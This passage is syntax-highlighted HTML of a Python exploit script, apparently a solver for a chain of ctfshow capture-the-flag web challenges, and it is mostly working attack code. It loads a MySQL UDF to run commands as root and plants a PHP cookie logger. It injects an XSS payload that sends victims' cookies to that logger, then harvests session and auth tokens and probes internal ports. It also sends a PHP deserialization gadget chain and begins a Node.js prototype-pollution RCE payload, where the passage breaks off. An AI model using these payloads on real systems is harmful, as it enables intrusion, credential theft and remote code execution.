</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s1>&#39;`mysql -uroot -proot -e &#34;create function sys_eval returns string soname </span><span class=se>\&#39;</span><span class=s1>udf.so</span><span class=se>\&#39;</span><span class=s1>&#34;`;&#39;</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;&#39;mysql -uroot -proot -e &#34;select sys_eval(&#39;sudo cat /root/you_win&#39;)&#34;&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span><span class=o>=</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>cmd</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>datax</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s1>&#39;echo `echo </span><span class=si>{0}</span><span class=s1>|base64 -d|sh`;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>cmd</span><span class=p>)}</span>
</span></span><span class=line><span class=cl><span class=n>r1</span><span class=o>=</span><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>datax</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r1</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#第二阶段</span>
</span></span><span class=line><span class=cl><span class=c1>#获取内网ip</span>
</span></span><span class=line><span class=cl><span class=n>r1</span><span class=o>=</span><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s1>&#39;echo `cat /etc/hosts`;&#39;</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>ip1</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;(172.*?)web&#39;</span><span class=p>,</span><span class=n>r1</span><span class=o>.</span><span class=n>text</span><span class=p>,</span><span class=n>re</span><span class=o>.</span><span class=n>S</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># print(ip1)</span>
</span></span><span class=line><span class=cl><span class=n>ip2</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>sub</span><span class=p>(</span><span class=s2>&#34;\.4$&#34;</span><span class=p>,</span><span class=s1>&#39;.5&#39;</span><span class=p>,</span><span class=n>ip1</span><span class=p>)</span>  <span class=c1>#另外一台服务器地址</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>ip2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#xss获取cookie</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;a.php&#39;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s2>&#34;file_put_contents(&#39;log.php&#39;,&#39;&lt;?php highlight_file(__FILE__);$parameter = $_SERVER[</span><span class=se>\&#34;</span><span class=s2>QUERY_STRING</span><span class=se>\&#34;</span><span class=s2>].$_SERVER[</span><span class=se>\&#34;</span><span class=s2>HTTP_COOKIE</span><span class=se>\&#34;</span><span class=s2>];file_put_contents(</span><span class=se>\&#34;</span><span class=s2>log.txt</span><span class=se>\&#34;</span><span class=s2>,$parameter);&#39;);?&gt;&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>u</span><span class=o>=</span><span class=s2>&#34;http://</span><span class=si>{0}</span><span class=s2>/log.php?s=&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>ip1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>a</span><span class=o>=</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>u</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=o>=</span><span class=n>a</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>i</span><span class=p>))</span><span class=o>+</span><span class=s1>&#39;,&#39;</span>
</span></span><span class=line><span class=cl><span class=n>a</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>sub</span><span class=p>(</span><span class=s2>&#34;,$&#34;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s1>&#39;`curl --header &#34;X-Forwarded-For:&lt;script&gt;window.location.href=String.fromCharCode(</span><span class=si>{0}</span><span class=s1>)+document.cookie;&lt;/script&gt;&#34; http://</span><span class=si>{1}</span><span class=s1>/index.php?action=login\&amp;u=0002\&amp;p=345`;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>ip2</span><span class=p>)})</span>
</span></span><span class=line><span class=cl><span class=c1>## 隔上一两分钟访问log.txt就能拿到cookie和auth</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>=</span><span class=n>sess</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;log.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>        <span class=n>phpsessid</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s2>&#34;(PHPSESSID=.*?);%20&#34;</span><span class=p>,</span><span class=n>log</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>auth</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s2>&#34;(auth=.*)&#34;</span><span class=p>,</span><span class=n>log</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(phpsessid)</span>
</span></span><span class=line><span class=cl>        <span class=n>flag656</span><span class=o>=</span><span class=nb>str</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>auth</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1>#web656</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;flag.*?=ctfshow{.*?}&#39;</span><span class=p>,</span><span class=n>flag656</span><span class=p>)[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>60</span><span class=p>)</span>    <span class=c1># 应该是一分钟一次</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#web667, 时间太久了，直接定位到3000端口，想跑一下也行</span>
</span></span><span class=line><span class=cl><span class=c1># for i in range(1,10000):</span>
</span></span><span class=line><span class=cl><span class=c1>#     cmd=&#39;echo file_get_contents(\&#39;http://&#39; + ip2 + &#39;:&#39; + str(i) + &#39;\&#39;);&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#     data5 = {&#39;1&#39;: cmd}</span>
</span></span><span class=line><span class=cl><span class=c1>#     r = sess.post(url + &#34;a.php&#34;, data=data5)</span>
</span></span><span class=line><span class=cl><span class=c1>#     print(i)</span>
</span></span><span class=line><span class=cl><span class=c1>#     if &#39;Connection refused&#39; not in r.text:</span>
</span></span><span class=line><span class=cl><span class=c1>#         print(cmd + &#39;\n&#39; + r.text)</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;echo file_get_contents(</span><span class=se>\&#39;</span><span class=s1>http://&#39;</span> <span class=o>+</span> <span class=n>ip2</span> <span class=o>+</span> <span class=s1>&#39;:3000&#39;</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\&#39;</span><span class=s1>);&#39;</span>
</span></span><span class=line><span class=cl><span class=n>data5</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span> <span class=n>cmd</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;a.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#web658</span>
</span></span><span class=line><span class=cl><span class=n>ser</span><span class=o>=</span><span class=s2>&#34;O%3A32%3A%22Codeception%5CExtension%5CRunProcess</span><span class=si>%22%</span><span class=s2>3A2%3A%7Bs%3A9%3A</span><span class=si>%22%</span><span class=s2>00%2A</span><span class=si>%00o</span><span class=s2>utput</span><span class=si>%22%</span><span class=s2>3BO%3A22%3A</span><span class=si>%22F</span><span class=s2>aker%5CDefaultGenerator</span><span class=si>%22%</span><span class=s2>3A1%3A%7Bs%3A10%3A</span><span class=si>%22%</span><span class=s2>00%2A</span><span class=si>%00d</span><span class=s2>efault</span><span class=si>%22%</span><span class=s2>3Bs%3A5%3A%22jiang</span><span class=si>%22%</span><span class=s2>3B%7Ds%3A43%3A</span><span class=si>%22%</span><span class=s2>00Codeception%5CExtension%5CRunProcess%00processes</span><span class=si>%22%</span><span class=s2>3Ba%3A1%3A%7Bi%3A0%3BO%3A22%3A</span><span class=si>%22F</span><span class=s2>aker%5CDefaultGenerator</span><span class=si>%22%</span><span class=s2>3A1%3A%7Bs%3A10%3A</span><span class=si>%22%</span><span class=s2>00%2A</span><span class=si>%00d</span><span class=s2>efault</span><span class=si>%22%</span><span class=s2>3BO%3A28%3A</span><span class=si>%22G</span><span class=s2>uzzleHttp%5CPsr7%5CAppendStream</span><span class=si>%22%</span><span class=s2>3A2%3A%7Bs%3A37%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CAppendStream</span><span class=si>%00s</span><span class=s2>treams</span><span class=si>%22%</span><span class=s2>3Ba%3A1%3A%7Bi%3A0%3BO%3A29%3A</span><span class=si>%22G</span><span class=s2>uzzleHttp%5CPsr7%5CCachingStream</span><span class=si>%22%</span><span class=s2>3A2%3A%7Bs%3A43%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CCachingStream</span><span class=si>%00r</span><span class=s2>emoteStream</span><span class=si>%22%</span><span class=s2>3BO%3A22%3A</span><span class=si>%22F</span><span class=s2>aker%5CDefaultGenerator</span><span class=si>%22%</span><span class=s2>3A1%3A%7Bs%3A10%3A</span><span class=si>%22%</span><span class=s2>00%2A</span><span class=si>%00d</span><span class=s2>efault</span><span class=si>%22%</span><span class=s2>3Bb%3A0%3B%7Ds%3A6%3A</span><span class=si>%22s</span><span class=s2>tream</span><span class=si>%22%</span><span class=s2>3BO%3A26%3A</span><span class=si>%22G</span><span class=s2>uzzleHttp%5CPsr7%5CPumpStream</span><span class=si>%22%</span><span class=s2>3A3%3A%7Bs%3A34%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CPumpStream</span><span class=si>%00s</span><span class=s2>ource</span><span class=si>%22%</span><span class=s2>3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure</span><span class=si>%22%</span><span class=s2>3A231%3A%7Ba%3A5%3A%7Bs%3A3%3A</span><span class=si>%22u</span><span class=s2>se</span><span class=si>%22%</span><span class=s2>3Ba%3A0%3A%7B%7Ds%3A8%3A</span><span class=si>%22f</span><span class=s2>unction</span><span class=si>%22%</span><span class=s2>3Bs%3A76%3A</span><span class=si>%22f</span><span class=s2>unction</span><span class=si>%28%</span><span class=s2>29%7B%5Cphpinfo</span><span class=si>%28%</span><span class=s2>29%3B%5Chighlight_file</span><span class=si>%28%</span><span class=s2>27</span><span class=si>%2F</span><span class=s2>var</span><span class=si>%2F</span><span class=s2>www</span><span class=si>%2F</span><span class=s2>html</span><span class=si>%2F</span><span class=s2>flag.php</span><span class=si>%27%</span><span class=s2>29%3B%5Cphpinfo</span><span class=si>%28%</span><span class=s2>29%3B%7D</span><span class=si>%22%</span><span class=s2>3Bs%3A5%3A</span><span class=si>%22s</span><span class=s2>cope</span><span class=si>%22%</span><span class=s2>3Bs%3A26%3A</span><span class=si>%22G</span><span class=s2>uzzleHttp%5CPsr7%5CPumpStream</span><span class=si>%22%</span><span class=s2>3Bs%3A4%3A%22this</span><span class=si>%22%</span><span class=s2>3BN%3Bs%3A4%3A</span><span class=si>%22s</span><span class=s2>elf</span><span class=si>%22%</span><span class=s2>3Bs%3A32%3A</span><span class=si>%22000000004e</span><span class=s2>63ed86000000002cc68e15</span><span class=si>%22%</span><span class=s2>3B%7D%7Ds%3A32%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CPumpStream</span><span class=si>%00s</span><span class=s2>ize</span><span class=si>%22%</span><span class=s2>3Bi%3A-10%3Bs%3A34%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CPumpStream%00buffer</span><span class=si>%22%</span><span class=s2>3BO%3A22%3A</span><span class=si>%22F</span><span class=s2>aker%5CDefaultGenerator</span><span class=si>%22%</span><span class=s2>3A1%3A%7Bs%3A10%3A</span><span class=si>%22%</span><span class=s2>00%2A</span><span class=si>%00d</span><span class=s2>efault</span><span class=si>%22%</span><span class=s2>3Bs%3A1%3A%22j</span><span class=si>%22%</span><span class=s2>3B%7D%7D%7D%7Ds%3A38%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CAppendStream</span><span class=si>%00s</span><span class=s2>eekable</span><span class=si>%22%</span><span class=s2>3Bb%3A1%3B%7D%7D%7D%7D&#34;</span>
</span></span><span class=line><span class=cl><span class=n>data6</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s1>&#39;echo ` curl  -H &#34;Content-Type: application/x-www-form-urlencoded&#34;   -X POST  -d &#34;UnserializeForm[ctfshowUnserializeData]=</span><span class=si>{0}</span><span class=s1>&#34; http://</span><span class=si>{1}</span><span class=s1>:8888?r=site/unserialize</span><span class=se>\\</span><span class=s1>&amp;key=flag_663%3Dctfshow%7Bfa5cc1fb0bfc986d1ef150269c0de197%7D`;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>ser</span><span class=p>,</span><span class=n>ip2</span><span class=p>)}</span>
</span></span><span class=line><span class=cl><span class=n>flags</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;flag.*?=ctfshow{.*?}&#39;</span><span class=p>,</span><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data6</span><span class=p>)</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flags</span><span class=p>[</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#web662</span>
</span></span><span class=line><span class=cl><span class=nb>list</span><span class=o>=</span><span class=s1>&#39;0123456789abcdef&#39;</span>
</span></span><span class=line><span class=cl><span class=n>m</span><span class=o>=</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>result</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span><span class=o>=</span><span class=s2>&#34;sudo curl &#34;</span><span class=o>+</span><span class=n>ip2</span><span class=o>+</span><span class=s2>&#34;/&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>j</span><span class=p>)</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>k</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;.html&#34;</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span><span class=o>=</span><span class=s2>&#34;select sys_eval(&#39;&#34;</span><span class=o>+</span><span class=n>payload</span><span class=o>+</span><span class=s2>&#34;&#39;);&#34;</span>
</span></span><span class=line><span class=cl>                <span class=c1># print(str(i)+str(j)+str(k)+&#34;.html&#34;)</span>
</span></span><span class=line><span class=cl>                <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;sql&#34;</span><span class=p>:</span> <span class=n>payload</span><span class=p>,}</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;sqltest.php&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>m</span><span class=o>=</span><span class=n>r</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=s1>&#39;404&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>result</span><span class=o>=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>result</span><span class=o>==</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>result</span><span class=o>==</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>##web664</span>
</span></span><span class=line><span class=cl><span class=n>ser</span><span class=o>=</span><span class=s2>&#34;O%3A32%3A%22Codeception%5CExtension%5CRunProcess</span><span class=si>%22%</span><span class=s2>3A2%3A%7Bs%3A9%3A</span><span class=si>%22%</span><span class=s2>00%2A</span><span class=si>%00o</span><span class=s2>utput</span><span class=si>%22%</span><span class=s2>3BO%3A22%3A</span><span class=si>%22F</span><span class=s2>aker%5CDefaultGenerator</span><span class=si>%22%</span><span class=s2>3A1%3A%7Bs%3A10%3A</span><span class=si>%22%</span><span class=s2>00%2A</span><span class=si>%00d</span><span class=s2>efault</span><span class=si>%22%</span><span class=s2>3Bs%3A5%3A%22jiang</span><span class=si>%22%</span><span class=s2>3B%7Ds%3A43%3A</span><span class=si>%22%</span><span class=s2>00Codeception%5CExtension%5CRunProcess%00processes</span><span class=si>%22%</span><span class=s2>3Ba%3A1%3A%7Bi%3A0%3BO%3A22%3A</span><span class=si>%22F</span><span class=s2>aker%5CDefaultGenerator</span><span class=si>%22%</span><span class=s2>3A1%3A%7Bs%3A10%3A</span><span class=si>%22%</span><span class=s2>00%2A</span><span class=si>%00d</span><span class=s2>efault</span><span class=si>%22%</span><span class=s2>3BO%3A28%3A</span><span class=si>%22G</span><span class=s2>uzzleHttp%5CPsr7%5CAppendStream</span><span class=si>%22%</span><span class=s2>3A2%3A%7Bs%3A37%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CAppendStream</span><span class=si>%00s</span><span class=s2>treams</span><span class=si>%22%</span><span class=s2>3Ba%3A1%3A%7Bi%3A0%3BO%3A29%3A</span><span class=si>%22G</span><span class=s2>uzzleHttp%5CPsr7%5CCachingStream</span><span class=si>%22%</span><span class=s2>3A2%3A%7Bs%3A43%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CCachingStream</span><span class=si>%00r</span><span class=s2>emoteStream</span><span class=si>%22%</span><span class=s2>3BO%3A22%3A</span><span class=si>%22F</span><span class=s2>aker%5CDefaultGenerator</span><span class=si>%22%</span><span class=s2>3A1%3A%7Bs%3A10%3A</span><span class=si>%22%</span><span class=s2>00%2A</span><span class=si>%00d</span><span class=s2>efault</span><span class=si>%22%</span><span class=s2>3Bb%3A0%3B%7Ds%3A6%3A</span><span class=si>%22s</span><span class=s2>tream</span><span class=si>%22%</span><span class=s2>3BO%3A26%3A</span><span class=si>%22G</span><span class=s2>uzzleHttp%5CPsr7%5CPumpStream</span><span class=si>%22%</span><span class=s2>3A3%3A%7Bs%3A34%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CPumpStream</span><span class=si>%00s</span><span class=s2>ource</span><span class=si>%22%</span><span class=s2>3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure</span><span class=si>%22%</span><span class=s2>3A228%3A%7Ba%3A5%3A%7Bs%3A3%3A</span><span class=si>%22u</span><span class=s2>se</span><span class=si>%22%</span><span class=s2>3Ba%3A0%3A%7B%7Ds%3A8%3A</span><span class=si>%22f</span><span class=s2>unction</span><span class=si>%22%</span><span class=s2>3Bs%3A73%3A</span><span class=si>%22f</span><span class=s2>unction</span><span class=si>%28%</span><span class=s2>29%7B%5Cphpinfo</span><span class=si>%28%</span><span class=s2>29%3B%5Chighlight_file</span><span class=si>%28%</span><span class=s2>27</span><span class=si>%2F</span><span class=s2>var</span><span class=si>%2F</span><span class=s2>oa</span><span class=si>%2F</span><span class=s2>flag664.php</span><span class=si>%27%</span><span class=s2>29%3B%5Cphpinfo</span><span class=si>%28%</span><span class=s2>29%3B%7D</span><span class=si>%22%</span><span class=s2>3Bs%3A5%3A</span><span class=si>%22s</span><span class=s2>cope</span><span class=si>%22%</span><span class=s2>3Bs%3A26%3A</span><span class=si>%22G</span><span class=s2>uzzleHttp%5CPsr7%5CPumpStream</span><span class=si>%22%</span><span class=s2>3Bs%3A4%3A%22this</span><span class=si>%22%</span><span class=s2>3BN%3Bs%3A4%3A</span><span class=si>%22s</span><span class=s2>elf</span><span class=si>%22%</span><span class=s2>3Bs%3A32%3A%22000000000b45001f0000000040612da3</span><span class=si>%22%</span><span class=s2>3B%7D%7Ds%3A32%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CPumpStream</span><span class=si>%00s</span><span class=s2>ize</span><span class=si>%22%</span><span class=s2>3Bi%3A-10%3Bs%3A34%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CPumpStream%00buffer</span><span class=si>%22%</span><span class=s2>3BO%3A22%3A</span><span class=si>%22F</span><span class=s2>aker%5CDefaultGenerator</span><span class=si>%22%</span><span class=s2>3A1%3A%7Bs%3A10%3A</span><span class=si>%22%</span><span class=s2>00%2A</span><span class=si>%00d</span><span class=s2>efault</span><span class=si>%22%</span><span class=s2>3Bs%3A1%3A%22j</span><span class=si>%22%</span><span class=s2>3B%7D%7D%7D%7Ds%3A38%3A</span><span class=si>%22%</span><span class=s2>00GuzzleHttp%5CPsr7%5CAppendStream</span><span class=si>%00s</span><span class=s2>eekable</span><span class=si>%22%</span><span class=s2>3Bb%3A1%3B%7D%7D%7D%7D&#34;</span>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s1>&#39;echo ` curl  -H &#34;Content-Type: application/x-www-form-urlencoded&#34;   -X POST  -d &#34;UnserializeForm[ctfshowUnserializeData]=</span><span class=si>{0}</span><span class=s1>&#34; http://</span><span class=si>{1}</span><span class=s1>:8888?r=site/unserialize</span><span class=se>\\</span><span class=s1>&amp;key=flag_663%3Dctfshow%7Bfa5cc1fb0bfc986d1ef150269c0de197%7D`;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>ser</span><span class=p>,</span><span class=n>ip2</span><span class=p>)}</span>
</span></span><span class=line><span class=cl><span class=n>flags</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;flag_.*?=ctfshow{.*?}&#39;</span><span class=p>,</span><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flags</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#用nodejs来rce</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;&#39;echo `curl -i -X POST -H &#39;Content-type&#39;:&#39;application/json&#39; -d &#34;{</span><span class=se>\\</span><span class=s1>&#34;__proto__</span><span class=se>\\</span><span class=s1>&#34;:{</span><span class=se>\\</span><span class=s1>&#34;__proto__</span><span class=se>\\</span><span class=s1>&#34;: {</span><span class=se>\\</span><span class=s1>&#34;type</span><span class=se>\\</span><span class=s1>&#34;:</span><span class=se>\\</span><span class=s1>&#34;Block</span><span class=se>\\</span><span class=s1>&#34;,</span><span class=se>\\</span><span class=s1>&#34;nodes</span><span class=se>\\</span><span class=s1>&#34;:</span><span class=se>\\</span><span class=s1>&#34;</span><span class=se>\\</span><span class=s1>&#34;,</span><span class=se>\\</span><span class=s1>&#34;compileDebug</span><span class=se>\\</span><span class=s1>&#34;:1,</span><span class=se>\\</span><span class=s1>&#34;self</span><span class=se>\\</span><span class=s1>&#34;:1,</span><span class=se>\\</span><span class=s1>&#34;line</span><span class=se>\\</span><span class=s1>&#34;:</span><span class=se>\\</span><span class=s1>&#34;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;echo 